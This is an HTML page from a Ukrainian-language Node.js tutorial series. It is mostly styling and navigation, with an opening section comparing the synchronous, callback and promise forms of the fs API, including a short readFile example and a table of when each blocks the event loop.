@@ -1,0 +1,1602 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>7. fs, path, process, os, child_process — Node.js Doc</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27><polygon points=%2750,8 92,50 50,92 8,50%27 fill=%27white%27/></svg>">
+<style>
+  :root{
+    --bg:#ffffff; --bg-soft:#f6f7f9; --card:#ffffff; --border:#e3e6ea;
+    --fg:#1a1d23; --fg-muted:#5b6270;
+    --accent:#2f6feb; --accent-soft:#eaf1ff;
+    --code-bg:#1e2230; --code-fg:#e7eaf2; --code-muted:#8b93a7;
+    --good:#1a7f4b; --good-bg:#e8f7ee; --good-border:#b6e3c6;
+    --bad:#c0392b; --bad-bg:#fdecea; --bad-border:#f3c2bb;
+    --warn:#9a6700; --warn-bg:#fff6e5; --warn-border:#f0dca3;
+    --info:#2f6feb; --info-bg:#eaf1ff; --info-border:#c6dafc;
+    --fun:#0f8a8a; --fun-bg:#e6f7f7; --fun-border:#bfe8e8;
+    --interview:#7c3aed; --interview-bg:#f5f0ff; --interview-border:#ddd0fa;
+    --notes:#7c3aed; --notes-bg:#f5f0ff; --notes-border:#ddd0fa;
+    --radius:12px;
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#14161b; --bg-soft:#1b1e25; --card:#1b1e25; --border:#2b2f3a;
+      --fg:#e7eaf2; --fg-muted:#9aa2b4;
+      --accent:#6d9bff; --accent-soft:#1c2740;
+      --code-bg:#0e1016; --code-fg:#e7eaf2; --code-muted:#7c8494;
+      --good:#5fd08d; --good-bg:#12261c; --good-border:#255c3c;
+      --bad:#ff8a7a; --bad-bg:#301716; --bad-border:#6b2a25;
+      --warn:#f0c25a; --warn-bg:#2c2411; --warn-border:#5c4a1c;
+      --info:#7fb0ff; --info-bg:#131f33; --info-border:#28416b;
+      --fun:#5fd6d6; --fun-bg:#0f2626; --fun-border:#1f4d4d;
+      --interview:#c4a6ff; --interview-bg:#241a35; --interview-border:#4b3570;
+      --notes:#c4a6ff; --notes-bg:#241a35; --notes-border:#4b3570;
+    }
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.6; font-size:16px;
+  }
+  code, pre, .mono{font-family:"SF Mono",ui-monospace,"Fira Code",Consolas,"Cascadia Code",monospace;}
+
+  header.top{
+    position:sticky; top:0; z-index:20;
+    background:color-mix(in srgb, var(--bg) 88%, transparent);
+    backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--border);
+  }
+  .top-inner{
+    max-width:1180px; margin:0 auto; padding:14px 24px;
+    display:flex; flex-direction:column; gap:10px;
+  }
+  .brand{font-weight:700; font-size:15px; white-space:nowrap;}
+  .brand span{color:var(--accent);}
+
+  .toptabs{display:flex; flex-direction:column; gap:8px;}
+  .toptabs input.tab-radio{display:none;}
+  .tab-bar{display:flex; gap:8px; flex-wrap:wrap;}
+  .tab-btn{
+    cursor:pointer; user-select:none; padding:6px 14px; border-radius:999px;
+    font-size:12.5px; font-weight:700; letter-spacing:.01em; color:var(--fg-muted);
+    border:1px solid var(--border); background:var(--bg-soft);
+    transition:background .15s, color .15s, border-color .15s;
+  }
+  .tab-btn:hover{background:var(--card);}
+  #tab-project:checked ~ .tab-bar label[for="tab-project"],
+  #tab-interview:checked ~ .tab-bar label[for="tab-interview"]{
+    background:var(--accent); color:#fff; border-color:var(--accent);
+  }
+  .tab-links{display:none; gap:6px; flex-wrap:wrap;}
+  #tab-project:checked ~ .tab-links.proj{display:flex;}
+  #tab-interview:checked ~ .tab-links.interview{display:flex;}
+  .tab-links a{
+    text-decoration:none; color:var(--fg-muted); font-size:13.5px;
+    padding:7px 12px; border-radius:999px; border:1px solid transparent;
+  }
+  .tab-links a:hover{background:var(--bg-soft); color:var(--fg);}
+  .tab-links a.active{background:var(--accent-soft); color:var(--accent); border-color:var(--accent-soft); font-weight:600;}
+
+  .hero{max-width:1180px; margin:0 auto; padding:46px 24px 18px;}
+  .hero .kicker{
+    color:var(--interview); font-weight:700; font-size:13px; letter-spacing:.06em;
+    text-transform:uppercase;
+  }
+  .hero h1{font-size:34px; margin:8px 0 10px; letter-spacing:-.02em;}
+  .hero p.lead{color:var(--fg-muted); font-size:17px; max-width:780px; margin:0;}
+  .hero .pills{display:flex; gap:8px; flex-wrap:wrap; margin-top:16px;}
+  .hero .pill{
+    font-size:12.5px; font-weight:600; padding:5px 12px; border-radius:999px;
+    background:var(--interview-bg); color:var(--interview); border:1px solid var(--interview-border);
+  }
+
+  .layout{
+    max-width:1440px; margin:0 auto; padding:20px 24px 100px;
+    display:flex; align-items:flex-start; gap:24px;
+  }
+  .nav-sidebar, aside.toc{flex-shrink:0;}
+  .nav-sidebar{width:180px;}
+  aside.toc{width:230px;}
+  .content-center{flex:1; min-width:0; display:flex; justify-content:center;}
+  .content-center > article{width:100%; max-width:760px;}
+  @media (max-width:900px){ .layout{flex-direction:column;}
+    .nav-sidebar, aside.toc{width:100%; position:static;}
+    .content-center{display:block;} }
+
+  .nav-sidebar{
+    position:sticky; top:74px; max-height:calc(100vh - 100px); overflow:auto;
+    border:1px solid var(--border); border-radius:var(--radius); background:var(--bg-soft);
+    padding:14px; display:flex; flex-direction:column; gap:4px;
+  }
+  .nav-sidebar input.tab-radio{display:none;}
+  .nav-tabbar{display:flex; flex-direction:column; gap:6px; margin-bottom:6px;}
+  .nav-tabbtn{
+    cursor:pointer; user-select:none; text-align:left; padding:8px 12px; border-radius:9px;
+    font-size:12.5px; font-weight:700; letter-spacing:.01em; color:var(--fg-muted);
+    border:1px solid var(--border); background:var(--card);
+    transition:background .15s, color .15s, border-color .15s;
+  }
+  .nav-tabbtn:hover{background:var(--bg);}
+  #tab-project:checked ~ .nav-tabbar label[for="tab-project"],
+  #tab-interview:checked ~ .nav-tabbar label[for="tab-interview"],
+  #tab-jsdoc:checked ~ .nav-tabbar label[for="tab-jsdoc"],
+  #tab-node:checked ~ .nav-tabbar label[for="tab-node"]{
+    background:var(--accent); color:#fff; border-color:var(--accent);
+  }
+  .nav-links{display:none; flex-direction:column; gap:2px;}
+  #tab-project:checked ~ .nav-links.proj{display:flex;}
+  #tab-interview:checked ~ .nav-links.interview{display:flex;}
+  #tab-jsdoc:checked ~ .nav-links.jsdoc{display:flex;}
+  #tab-node:checked ~ .nav-links.node{display:flex;}
+  .nav-links a{
+    text-decoration:none; color:var(--fg-muted); font-size:13px;
+    padding:6px 10px; border-radius:7px; line-height:1.3;
+  }
+  .nav-links a:hover{background:var(--card); color:var(--fg);}
+  .nav-links a.active{background:var(--accent-soft); color:var(--accent); font-weight:600;}
+
+  aside.toc{
+    position:sticky; top:74px; max-height:calc(100vh - 100px); overflow:auto;
+    border:1px solid var(--border); border-radius:var(--radius); background:var(--bg-soft);
+    padding:16px;
+  }
+  aside.toc .toc-title{font-size:12px; text-transform:uppercase; letter-spacing:.06em; color:var(--fg-muted); font-weight:700; margin-bottom:10px;}
+  aside.toc ol{list-style:none; margin:0; padding:0;}
+  aside.toc li{margin:0 0 4px;}
+  aside.toc a{
+    display:block; text-decoration:none; color:var(--fg-muted); font-size:13.5px;
+    padding:6px 8px; border-radius:8px; line-height:1.35;
+  }
+  aside.toc a:hover{background:var(--card); color:var(--fg);}
+  aside.toc .toc-group{font-size:11px; text-transform:uppercase; letter-spacing:.06em; color:var(--accent); font-weight:700; margin:14px 0 4px; padding:0 8px;}
+  aside.toc .toc-group:first-child{margin-top:0;}
+  aside.toc .toc-nav{list-style:none; margin:0 0 4px; padding:0;}
+  aside.toc .toc-nav li{margin:0 0 2px;}
+  aside.toc .toc-nav a{display:block; text-decoration:none; color:var(--fg-muted); font-size:13px; padding:5px 8px; border-radius:7px; line-height:1.3;}
+  aside.toc .toc-nav a:hover{background:var(--card); color:var(--fg);}
+  aside.toc .toc-nav a.active{background:var(--accent-soft); color:var(--accent); font-weight:600;}
+  aside.toc .toc-divider{height:1px; background:var(--border); margin:16px 0;}
+
+  article section{margin-bottom:52px; scroll-margin-top:80px;}
+  article h2{
+    font-size:23px; margin:0 0 6px; display:flex; align-items:baseline; gap:10px;
+    letter-spacing:-.01em;
+  }
+  article h2 .num{color:var(--accent); font-variant-numeric:tabular-nums; font-size:16px;}
+  article h3{font-size:17px; margin:26px 0 8px;}
+  article p{color:var(--fg); margin:10px 0;}
+  article p.muted{color:var(--fg-muted);}
+  article ul, article ol{padding-left:22px;}
+  article li{margin:6px 0;}
+  .section-desc{color:var(--fg-muted); margin-top:2px; margin-bottom:18px;}
+
+  .card{
+    border:1px solid var(--border); border-radius:var(--radius); background:var(--card);
+    padding:18px 20px; margin:16px 0;
+  }
+
+  .codecard{
+    border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0;
+    background:var(--code-bg);
+  }
+  .codecard .bar{
+    display:flex; align-items:center; justify-content:space-between; gap:10px;
+    padding:8px 14px; background:color-mix(in srgb, var(--code-bg) 80%, black 6%);
+    border-bottom:1px solid color-mix(in srgb, var(--code-fg) 12%, transparent);
+  }
+  .codecard .bar .path{color:var(--code-muted); font-size:12.5px;}
+  .codecard pre{margin:0; padding:16px; overflow:auto;}
+  .codecard code{color:var(--code-fg); font-size:13px; white-space:pre;}
+  .codecard code .tok-kw{color:#cc7832;}
+  .codecard code .tok-str{color:#6a8759;}
+  .codecard code .tok-num{color:#6897bb;}
+  .codecard code .tok-com{color:#7f7f7f; font-style:italic;}
+  .codecard code .tok-deco{color:#bbb529;}
+  .codecard code .tok-def{color:#ffc66d;}
+  .codecard code .tok-self{color:#c792ea;}
+  .cmt{color:#7c8494;}
+  .out{color:#f0c25a;}
+
+  .callout{
+    border-radius:var(--radius); border:1px solid; padding:14px 16px; margin:16px 0;
+    display:flex; gap:12px; align-items:flex-start; font-size:14.5px;
+  }
+  .callout .ic{font-size:17px; line-height:1.4;}
+  .callout.good{background:var(--good-bg); border-color:var(--good-border); color:var(--good);}
+  .callout.bad{background:var(--bad-bg); border-color:var(--bad-border); color:var(--bad);}
+  .callout.warn{background:var(--warn-bg); border-color:var(--warn-border); color:var(--warn);}
+  .callout.info{background:var(--info-bg); border-color:var(--info-border); color:var(--info);}
+  .callout.fun{background:var(--fun-bg); border-color:var(--fun-border); color:var(--fun);}
+  .callout.interview{background:var(--interview-bg); border-color:var(--interview-border); color:var(--interview);}
+  .callout .body{color:var(--fg);}
+  .callout .body b{color:inherit;}
+  .callout .body .tag{
+    display:inline-block; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:.04em;
+    margin-bottom:4px;
+  }
+
+  table{width:100%; border-collapse:collapse; margin:16px 0; font-size:14px;}
+  th, td{text-align:left; padding:10px 12px; border-bottom:1px solid var(--border); vertical-align:top;}
+  th{color:var(--fg-muted); font-weight:600; font-size:12.5px; text-transform:uppercase; letter-spacing:.03em;}
+  tr:last-child td{border-bottom:none;}
+
+  .badge{
+    display:inline-block; font-size:11.5px; font-weight:700; padding:2px 9px; border-radius:999px;
+    text-transform:uppercase; letter-spacing:.03em;
+  }
+  .badge.good{background:var(--good-bg); color:var(--good); border:1px solid var(--good-border);}
+  .badge.bad{background:var(--bad-bg); color:var(--bad); border:1px solid var(--bad-border);}
+
+  .fe-analogy{
+    border-left:3px solid var(--accent); background:var(--accent-soft); border-radius:0 var(--radius) var(--radius) 0;
+    padding:12px 16px; margin:16px 0; font-size:14.5px;
+  }
+  .fe-analogy .tag{font-weight:700; color:var(--accent); font-size:12px; text-transform:uppercase; letter-spacing:.05em; margin-bottom:4px;}
+
+  /* Q&A accordion */
+  .qa{border:1px solid var(--border); border-radius:12px; margin:10px 0; overflow:hidden; background:var(--card);}
+  .qa summary{
+    cursor:pointer; padding:14px 46px 14px 16px; font-weight:600; list-style:none;
+    position:relative; font-size:14.8px;
+  }
+  .qa summary::-webkit-details-marker{display:none;}
+  .qa summary::after{
+    content:"+"; color:var(--fg-muted); font-size:19px; position:absolute; right:16px; top:50%;
+    transform:translateY(-56%); font-weight:400;
+  }
+  .qa[open] summary::after{content:"–";}
+  .qa summary:hover{background:var(--bg-soft);}
+  .qa .a{padding:0 16px 16px; color:var(--fg-muted); font-size:14.3px; border-top:1px solid var(--border); padding-top:12px;}
+  .qa .a b{color:var(--fg);}
+  .qa .a code{color:var(--fg);}
+  .qa .difficulty{
+    display:inline-block; font-size:10.5px; font-weight:700; padding:2px 8px; border-radius:999px;
+    margin-right:8px; vertical-align:middle;
+  }
+  .qa .difficulty.trick{background:var(--interview-bg); color:var(--interview); border:1px solid var(--interview-border);}
+  .qa .difficulty.core{background:var(--info-bg); color:var(--info); border:1px solid var(--info-border);}
+
+  .cheat{border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0;}
+  .cheat table{margin:0;}
+  .cheat th{background:var(--bg-soft);}
+
+  /* Nesting (matryoshka) diagram */
+  .nest{border:2px solid var(--border); border-radius:16px; padding:30px 20px 20px; position:relative; margin:0;}
+  .nest .tag{
+    position:absolute; top:-11px; left:16px; background:var(--bg); padding:0 8px;
+    font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:.04em;
+  }
+  .nest p{margin:0; color:var(--fg-muted); font-size:13.8px;}
+  .nest.level1{border-color:var(--accent); margin:20px 0;}
+  .nest.level1 > .tag{color:var(--accent);}
+  .nest.level2{border-color:var(--fun); margin-top:16px;}
+  .nest.level2 > .tag{color:var(--fun);}
+  .nest.level3{border-color:var(--interview); margin-top:16px; background:var(--bg-soft);}
+  .nest.level3 > .tag{color:var(--interview);}
+
+  /* Flashcards for term memorization */
+  .flashgrid{display:grid; grid-template-columns:repeat(auto-fit,minmax(230px,1fr)); gap:14px; margin:16px 0;}
+  .flashcard{border:1px solid var(--border); border-radius:12px; padding:16px 18px; background:var(--card);}
+  .flashcard .fc-num{
+    display:inline-block; width:22px; height:22px; border-radius:50%; background:var(--interview-bg);
+    color:var(--interview); font-size:12px; font-weight:700; text-align:center; line-height:22px; margin-bottom:8px;
+  }
+  .flashcard .term{font-weight:700; font-size:15.5px; margin-bottom:6px;}
+  .flashcard .def{font-size:13.6px; color:var(--fg); margin-bottom:10px;}
+  .flashcard .mnemo{font-size:13px; color:var(--fg-muted); font-style:italic; border-top:1px dashed var(--border); padding-top:9px;}
+  .flashcard .mnemo b{color:var(--fun); font-style:normal;}
+
+  .rule-box{
+    border:1px dashed var(--interview-border); background:var(--interview-bg); border-radius:var(--radius);
+    padding:16px 18px; margin:18px 0; font-size:14.8px;
+  }
+  .rule-box b{color:var(--interview);}
+
+  figure.diagram{
+    margin:20px 0; padding:20px 20px 16px; border:1px solid var(--border); border-radius:var(--radius);
+    background:var(--bg-soft);
+  }
+  figure.diagram svg{display:block; width:100%; height:auto; max-width:720px; margin:0 auto; color:var(--fg);}
+  figure.diagram svg text{font-family:inherit;}
+  figure.diagram figcaption{
+    margin-top:12px; font-size:13px; color:var(--fg-muted); text-align:center; line-height:1.5;
+  }
+
+  footer.page{
+    max-width:1180px; margin:0 auto; padding:20px 24px 60px; color:var(--fg-muted); font-size:13.5px;
+    border-top:1px solid var(--border); margin-top:20px; padding-top:24px;
+  }
+  footer.page a{color:var(--accent); text-decoration:none;}
+
+  /* --- node-doc extras --- */
+  .tree{
+    background:var(--code-bg); color:var(--code-fg); border-radius:var(--radius); padding:18px 20px;
+    font-size:13px; overflow:auto; border:1px solid var(--border);
+    white-space:pre; line-height:1.5;
+  }
+  .tree .d{color:#7fb0ff;} .tree .c{color:#7c8494;}
+
+  .grid2{display:grid; grid-template-columns:1fr 1fr; gap:16px;}
+  @media (max-width:700px){.grid2{grid-template-columns:1fr;}}
+
+  .flow{display:flex; align-items:center; flex-wrap:wrap; gap:10px; margin:18px 0;}
+  .flow .step{
+    border:1px solid var(--border); background:var(--bg-soft); border-radius:10px;
+    padding:10px 14px; font-size:13.5px; font-weight:600;
+  }
+  .flow .arrow{color:var(--fg-muted); font-size:16px;}
+  article a{color:var(--accent); text-underline-offset:2px;}
+  article a:hover{text-decoration-thickness:2px;}
+
+  .tag{
+    flex-shrink:0; display:inline-block; font-size:10.5px; font-weight:700; padding:3px 9px;
+    border-radius:999px; white-space:nowrap;
+  }
+  .tag.recurring{background:var(--bad-bg); color:var(--bad); border:1px solid var(--bad-border);}
+  .tag.gap{background:var(--warn-bg); color:var(--warn); border:1px solid var(--warn-border);}
+  .tag.rising{background:var(--fun-bg); color:var(--fun); border:1px solid var(--fun-border);}
+  .tag.strength{background:var(--good-bg); color:var(--good); border:1px solid var(--good-border);}
+  .tag.notes{background:var(--notes-bg); color:var(--notes); border:1px solid var(--notes-border);}
+  .task{margin:22px 0;}
+  .task .task-head{display:flex; align-items:center; gap:8px; margin-bottom:8px;}
+  .task .tasknum{color:var(--accent); font-weight:700; font-size:13px; flex-shrink:0;}
+  .task .taskdiff{
+    display:inline-block; font-size:10.5px; font-weight:700; padding:2px 8px; border-radius:999px;
+    flex-shrink:0;
+  }
+  .task .taskdiff.easy{background:var(--good-bg); color:var(--good); border:1px solid var(--good-border);}
+  .task .taskdiff.mid{background:var(--warn-bg); color:var(--warn); border:1px solid var(--warn-border);}
+  .task .taskdiff.hard{background:var(--bad-bg); color:var(--bad); border:1px solid var(--bad-border);}
+  .task .tasktitle{font-weight:600; font-size:14.5px;}
+  details.answer{
+    border:1px solid var(--border); border-radius:10px; margin-top:2px; background:var(--bg-soft);
+    overflow:hidden;
+  }
+  details.answer summary{
+    cursor:pointer; padding:10px 14px; font-weight:600; font-size:13.5px; color:var(--accent);
+    list-style:none; user-select:none;
+  }
+  details.answer summary::-webkit-details-marker{display:none;}
+  details.answer summary::before{content:"▸ Показати відповідь"; }
+  details.answer[open] summary::before{content:"▾ Відповідь"; }
+  details.answer .a-body{
+    padding:0 14px 14px; border-top:1px solid var(--border); padding-top:12px;
+    font-size:14px; color:var(--fg);
+  }
+  details.answer .a-body p{margin:8px 0;}
+  details.answer .a-body .out{
+    font-family:"SF Mono",ui-monospace,"Fira Code",Consolas,"Cascadia Code",monospace;
+    background:var(--code-bg); color:var(--code-fg); padding:8px 12px; border-radius:8px;
+    display:block; margin:8px 0; white-space:pre; font-size:13px;
+  }
+  .topic-head{display:flex; align-items:center; gap:10px; margin-bottom:6px;}
+  .topic-head h2{font-size:21px; margin:0; letter-spacing:-.01em;}
+  .decision{
+    border:1px solid var(--border); border-left:4px solid var(--accent); border-radius:var(--radius);
+    background:var(--bg-soft); padding:16px 18px; margin:20px 0;
+  }
+  .decision-title{font-weight:700; font-size:15px; margin-bottom:4px;}
+  .decision table{margin:10px 0; background:var(--card); border-radius:8px;}
+  .decision p{margin:10px 0; font-size:15px;}
+  tr.chosen td{background:var(--good-bg);}
+  tr.chosen td:first-child{color:var(--good);}
+  .remember{
+    border:1px dashed var(--warn-border); background:var(--warn-bg); color:var(--fg);
+    border-radius:var(--radius); padding:12px 16px; margin:18px 0 0; font-size:15px;
+  }
+  .remember b{color:var(--warn);}
+  .callout .body a{color:inherit; font-weight:600; text-decoration:underline;}
+  article table{display:block; overflow-x:auto;}
+  @media (min-width:700px){ article table{display:table;} }
+</style>
+</head>
+<body>
+
+<header class="top">
+  <div class="top-inner">
+    <div class="brand">🟢 Node.js Doc <span>· AI Delivery Planner</span></div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="kicker">Node.js Doc · Туторіал 7 з 20</div>
+  <h1>fs, path, process, os, child_process: Node як системна мова</h1>
+  <p class="lead">Node — це не лише HTTP-сервери: це файли, процеси, сигнали і CLI-утиліти. Розберемо три API <code>fs</code>, атомарні записи, <code>path.join</code> vs <code>path.resolve</code>, чому <b><code>process.exitCode</code> краще за <code>process.exit()</code></b>, graceful shutdown по SIGTERM, чотири способи запустити дочірній процес і як не відкрити shell injection.</p>
+</div>
+
+<div class="layout">
+  <aside class="nav-sidebar">
+    <input type="radio" name="topgroup" id="tab-project" class="tab-radio">
+    <input type="radio" name="topgroup" id="tab-interview" class="tab-radio">
+    <input type="radio" name="topgroup" id="tab-jsdoc" class="tab-radio">
+    <input type="radio" name="topgroup" id="tab-node" class="tab-radio" checked>
+    <div class="nav-tabbar">
+      <label for="tab-project" class="nav-tabbtn">📁 Про проєкт</label>
+      <label for="tab-interview" class="nav-tabbtn">🐍 Python Doc</label>
+      <label for="tab-jsdoc" class="nav-tabbtn">📚 JS Doc</label>
+      <label for="tab-node" class="nav-tabbtn">🟢 Node.js</label>
+    </div>
+      <nav class="nav-links proj">
+        <a href="../python-tutorials/00-backend-from-scratch.html">0. Бекенд з нуля: гайд</a>
+        <a href="../python-tutorials/01-architecture.html">1. Архітектура</a>
+        <a href="../python-tutorials/02-async-and-security.html">2. Async &amp; Безпека</a>
+        <a href="../python-tutorials/03-scaling.html">3. Масштабування</a>
+      </nav>
+      <nav class="nav-links interview">
+        <a href="../python-tutorials/04-python-types.html">4. Типи</a>
+        <a href="../python-tutorials/05-classes-decorators-syntax.html">5. Класи &amp; цукор</a>
+        <a href="../python-tutorials/06-gil-and-concurrency.html">6. GIL &amp; Конкурентність</a>
+        <a href="../python-tutorials/07-generators-iterators-exceptions.html">7. Генератори &amp; Винятки</a>
+        <a href="../python-tutorials/08-stdlib-utilities.html">8. Утиліти stdlib</a>
+        <a href="../python-tutorials/09-memory-management.html">9. Пам'ять &amp; GC</a>
+        <a href="../python-tutorials/10-wsgi-asgi.html">10. WSGI vs ASGI</a>
+        <a href="../python-tutorials/11-logging.html">11. Логування</a>
+        <a href="../python-tutorials/12-packaging-and-dependencies.html">12. Пакування</a>
+        <a href="../python-tutorials/13-design-patterns.html">13. Патерни</a>
+        <a href="../python-tutorials/14-oop-and-solid.html">14. ООП &amp; SOLID</a>
+        <a href="../python-tutorials/15-serialization-and-numbers.html">15. Серіалізація &amp; числа</a>
+        <a href="../python-tutorials/16-pydantic.html">16. Pydantic</a>
+        <a href="../python-tutorials/17-databases-fundamentals.html">17. Бази даних: основи</a>
+        <a href="../python-tutorials/18-databases-interview-qa.html">18. Бази даних: Q&amp;A</a>
+        <a href="../python-tutorials/19-postgres-storage-and-memory.html">19. Postgres storage &amp; пам'ять</a>
+        <a href="../python-tutorials/20-redis.html">20. Redis</a>
+        <a href="../python-tutorials/21-route-optimization-or-tools.html">21. OR-Tools &amp; VRP</a>
+        <a href="../python-tutorials/22-multi-tenancy-saas.html">22. Multi-tenancy</a>
+        <a href="../python-tutorials/23-testing-cicd-monitoring-cloud.html">23. Тести, CI/CD, моніторинг</a>
+        <a href="../python-tutorials/24-senior-interview-qa.html">24. 74 питання Senior</a>
+        <a href="../python-tutorials/25-system-design.html">25. Системний дизайн</a>
+        <a href="../python-tutorials/26-sentry-monitoring.html">26. Sentry: моніторинг</a>
+        <a href="../python-tutorials/27-kubernetes.html">27. Kubernetes</a>
+      </nav>
+      <nav class="nav-links jsdoc">
+        <a href="../js-doc/00-methodology.html">0. Методологія</a>
+        <a href="../js-doc/01-core-js-engine.html">1. Core JS та рушій</a>
+        <a href="../js-doc/02-this.html">2. this</a>
+        <a href="../js-doc/03-typescript-essentials.html">3. TypeScript essentials</a>
+        <a href="../js-doc/04-algorithms-patterns.html">4. Алгоритми й патерни</a>
+        <a href="../js-doc/05-browser-internals.html">5. Браузер зсередини</a>
+        <a href="../js-doc/06-frontend-security.html">6. Безпека фронтенду</a>
+        <a href="../js-doc/07-http-anatomy.html">7. HTTP: анатомія запитів</a>
+        <a href="../js-doc/08-data-realtime.html">8. Дані й реальний час</a>
+        <a href="../js-doc/09-react-deep-dive.html">9. React углиб</a>
+        <a href="../js-doc/10-nextjs-architecture.html">10. Next.js та архітектура</a>
+        <a href="../js-doc/11-nextjs-interview-qa.html">11. Next.js: Q&amp;A</a>
+        <a href="../js-doc/12-frontend-caching-fundamentals.html">12. Caching: основи</a>
+        <a href="../js-doc/13-frontend-caching-libraries.html">13. Caching: бібліотеки</a>
+        <a href="../js-doc/14-frontend-caching-advanced.html">14. Caching: просунуті теми</a>
+        <a href="../js-doc/15-testing-cicd-cloud.html">15. Тести, CI/CD, хмара</a>
+        <a href="../js-doc/16-ai-tools.html">16. AI-інструменти</a>
+        <a href="../js-doc/17-design-patterns.html">17. Патерни проєктування</a>
+      </nav>
+      <nav class="nav-links node">
+        <a href="01-node-architecture.html">1. Архітектура Node.js</a>
+        <a href="02-event-loop-deep-dive.html">2. Event loop детально</a>
+        <a href="03-async-patterns.html">3. Асинхронні патерни</a>
+        <a href="04-modules-cjs-esm.html">4. Модулі: CJS vs ESM</a>
+        <a href="05-npm-packages.html">5. npm, pnpm, yarn</a>
+        <a href="06-events-streams-buffers.html">6. Events, Streams, Buffer</a>
+        <a href="07-fs-process-os.html" class="active">7. fs, process, os</a>
+        <a href="08-concurrency-scaling.html">8. Workers, cluster, масштаб</a>
+        <a href="09-http-networking.html">9. HTTP і мережа</a>
+        <a href="10-frameworks-comparison.html">10. Фреймворки: огляд</a>
+        <a href="11-nestjs-architecture.html">11. NestJS і архітектура</a>
+        <a href="12-databases-orm.html">12. БД і ORM</a>
+        <a href="13-typescript-validation-config.html">13. TS, валідація, конфіг</a>
+        <a href="14-security.html">14. Безпека Node</a>
+        <a href="15-performance-memory.html">15. Продуктивність і пам'ять</a>
+        <a href="16-testing.html">16. Тестування</a>
+        <a href="17-production-observability.html">17. Продакшн і моніторинг</a>
+        <a href="18-realtime-queues.html">18. Real-time і черги</a>
+        <a href="19-runtimes-serverless.html">19. Deno, Bun, serverless</a>
+        <a href="20-senior-interview-qa.html">20. Питання Senior Node</a>
+      </nav>
+  </aside>
+
+    <aside class="toc">
+    <div class="toc-title">На цій сторінці</div>
+    <ol>
+      <li><a href="#s1">1. fs: три API</a></li>
+      <li><a href="#s2">2. readFile vs streams, fd і FileHandle</a></li>
+      <li><a href="#s3">3. Атомарні записи і робота з деревами</a></li>
+      <li><a href="#s4">4. fs.watch: чому це важко</a></li>
+      <li><a href="#s5">5. path: join vs resolve</a></li>
+      <li><a href="#s6">6. URL і file:// шляхи</a></li>
+      <li><a href="#s7">7. process: середовище й метрики</a></li>
+      <li><a href="#s8">8. Життєвий цикл і коди виходу</a></li>
+      <li><a href="#s9">9. Сигнали, stdio і graceful shutdown</a></li>
+      <li><a href="#s10">10. Модуль os</a></li>
+      <li><a href="#s11">11. child_process</a></li>
+      <li><a href="#s12">12. Пишемо CLI</a></li>
+      <li><a href="#s13">13. --env-file, --watch, permission model</a></li>
+      <li><a href="#s14">14. Каверзні питання співбесіди</a></li>
+      <li><a href="#s15">15. Шпаргалка</a></li>
+      <li><a href="#s16">16. Як запам'ятати</a></li>
+    </ol>
+  </aside>
+
+  <div class="content-center">
+    <article>
+
+    <section id="s1">
+      <h2><span class="num">01</span> fs: три API</h2>
+      <p class="section-desc">Одна й та сама операція є в трьох варіантах; вибір між ними — це вибір "блокувати event loop чи ні".</p>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">three-apis.mjs</span></div>
+        <pre><code>import fs from 'node:fs';
+import { readFile } from 'node:fs/promises';
+
+// 1) Sync — блокує весь потік, поки ОС не віддасть дані; помилка = throw
+const a = fs.readFileSync('config.json', 'utf8');
+
+// 2) Callback — error-first, виконується в threadpool libuv
+fs.readFile('config.json', 'utf8', (err, b) =&gt; { if (err) return handle(err); /* ... */ });
+
+// 3) Promises — те саме, що callback, але з await; рекомендований стиль
+const c = await readFile('config.json', 'utf8');</code></pre>
+      </div>
+
+      <table>
+        <tr><th>API</th><th>Блокує event loop?</th><th>Де виконується</th><th>Коли доречний</th></tr>
+        <tr><td><code>fs.*Sync</code></td><td><b>так</b></td><td>головний потік</td><td>старт застосунку, CLI-скрипти, build-тули, <code>require</code>-час</td></tr>
+        <tr><td><code>fs.*(cb)</code></td><td>ні</td><td>libuv threadpool (4 потоки за замовчуванням)</td><td>легасі-код, максимальна швидкодія в гарячих шляхах</td></tr>
+        <tr><td><code>fs/promises</code></td><td>ні</td><td>той самий threadpool</td><td>за замовчуванням у новому коді</td></tr>
+      </table>
+
+      <h3>Коли sync — це нормально</h3>
+      <ul>
+        <li><b>На старті</b>: прочитати конфіг, TLS-сертифікат, SQL-міграцію до <code>server.listen()</code>. Запитів ще немає —
+        блокувати нікого. Код простіший, помилка одразу валить старт (що й треба).</li>
+        <li><b>CLI-утиліти</b> та скрипти, які роблять одну справу послідовно: паралельно обслуговувати нікого.</li>
+        <li><b>Ніколи</b> — в обробнику HTTP-запиту, у колбеку черги, у будь-якому коді, що виконується "на кожен запит".
+        Один <code>readFileSync</code> на 50 MB файлі — і всі паралельні запити чекають.</li>
+      </ul>
+
+      <div class="callout info"><div class="ic">💡</div><div class="body">Файлові операції в libuv — це <b>не</b>
+      справжнє асинхронне I/O ОС (як epoll для сокетів), а блокуючі виклики в пулі потоків. Тому 4 повільні операції з
+      диском (або 4 <code>crypto.pbkdf2</code>, або <code>dns.lookup</code>) можуть зайняти весь пул, і п'ята
+      <code>readFile</code> чекатиме. Детально — <a href="02-event-loop-deep-dive.html">туторіал 2</a> та
+      <code>UV_THREADPOOL_SIZE</code> у <a href="08-concurrency-scaling.html">туторіалі 8</a>.</div></div>
+
+      <div class="callout interview"><div class="ic">💼</div><div class="body"><span class="tag">На співбесіді запитають так</span>
+      "Чи завжди <code>readFileSync</code> — погано?" — Ні: на старті й у CLI він доречний і навіть кращий (простіше, помилка
+      рано). Погано — в коді, що виконується конкурентно з обробкою запитів.</div></div>
+    </section>
+
+    <section id="s2">
+      <h2><span class="num">02</span> readFile vs streams, fd і FileHandle</h2>
